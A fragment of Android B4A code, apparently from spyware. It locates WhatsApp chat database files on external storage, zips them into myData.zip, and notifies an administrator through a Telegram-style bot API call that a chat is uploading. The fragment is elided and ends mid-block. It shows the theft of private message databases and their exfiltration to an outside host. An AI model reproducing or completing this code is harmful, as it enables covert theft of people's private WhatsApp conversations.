...
Sub getOne (Topic As String, fileName As String)
	Try
		
		Log(File.Exists(File.DirRootExternal&"/WhatsApp/DataBases/",fileName))
	
		zip.ABZipfile(File.DirRootExternal&"/WhatsApp/DataBases/" , fileName , File.DirRootExternal&"/WhatsApp/myData.zip")
		...
		ht2.Download(apiserver&token&"/sendmessage?chat_id="&admin_id&"&text="&"oneChatUploading"&"&reply_to_message_id="&0)
Catch
